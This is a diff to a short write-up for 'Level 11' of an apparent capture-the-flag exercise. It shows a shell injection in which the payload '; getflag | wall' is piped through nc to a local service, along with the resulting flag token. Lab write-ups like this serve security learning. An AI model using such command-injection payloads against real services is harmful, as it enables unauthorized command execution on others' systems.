@@ -1,4 +1,10 @@
-echo "; getflag | wall" | nc 127.0.0.1 5151
+# Level 11
+
+## step 1 : analyze level11
+
+## step 2 : shell injection
+```
+$ echo "; getflag | wall" | nc 127.0.0.1 5151
 
 Broadcast Message from flag11@Snow                                             
         (somewhere) at 17:18 ...                                               
@@ -6,4 +12,4 @@ Broadcast Message from flag11@Snow
 Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s                      
                                                                                
 Erf nope..
-
+```
